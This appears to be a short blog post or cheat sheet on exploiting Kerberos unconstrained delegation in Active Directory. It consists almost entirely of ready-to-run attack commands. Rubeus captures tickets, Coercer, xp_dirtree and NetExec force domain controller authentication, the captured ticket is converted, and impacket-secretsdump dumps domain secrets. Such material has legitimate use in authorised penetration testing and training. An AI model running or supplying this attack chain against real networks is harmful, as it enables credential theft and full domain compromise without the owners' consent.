---
title: "Kerberos Unconstrained Delegation"
date: 2025-11-13 00:00:00 +0800
categories: [Kerberos Based Attacks]
tags: [Unconstrained Delegation, Rubeus, coercer]
platform: AD- Attacks
author: 0xmr
image: /assets/img/posts/ud.png
excerpt: "Technical understanding and practical overview"
---

# Kerberos Unconstrained Delegation

> Unconstrained Delegation is a feature in Active Directory that allows
> designated services to act on behalf of users and request access to
> other network resources without requiring additional authentication.
> This delegation model grants those services broad authority, allowing
> them to impersonate **any user to any service**. While powerful, it
> poses serious security risks when misconfigured.

------------------------------------------------------------------------

## Detecting Unconstrained Delegation

```bash
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

```bash
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,servicePrincipalName,Description |
    Format-List Name,TrustedForDelegation,servicePrincipalName,Description
```

------------------------------------------------------------------------

## Exploitation

Monitor incoming Kerberos tickets:

```bash
.\Rubeus.exe monitor /interval:5 /nowrap
```

Monitor for a specific user:

```bash
.\Rubeus.exe monitor /interval:10 /targetuser:$target_user  /nowrap
```

Request Deleg Ticket for Computers:
```bash
.\Rubeus.exe tgtdeleg  /nowrap
```

------------------------------------------------------------------------

## Coerce Authentication

Trigger authentication from the target system:

```bash
xp_dirtree \\$target_Domain\share
```

```bash
coercer coerce -u $user -p '$pass' -d $Domain -l $target_Domain -t $IP
```

```bash
python3 coercer.py -u $user -h <hash> -d $Domain -l $IP -t $target_Domain
```

```bash
nxc smb $ip -u $user -p '$pass' -M coerce_plus -o LISTENER=$target_Domain ALWAYS=true
```

------------------------------------------------------------------------

## Decode Base64 Ticket
```bash
nano ticket.kirbi.b64
base64 -d ticket.kirbi.b64 > DC.kirbi
```
or
```bash
echo "<ticket>" | base64 -d > DC.kirbi
```

------------------------------------------------------------------------

## Convert to `.kirbi` Format

```bash
impacket-ticketConverter DC.kirbi DC.ccache
```

Set ccache:

```bash
export KRB5CCNAME=DC.ccache
```

Dump domain secrets:

```bash
impacket-secretsdump -k -no-pass -just-dc $Domain
```
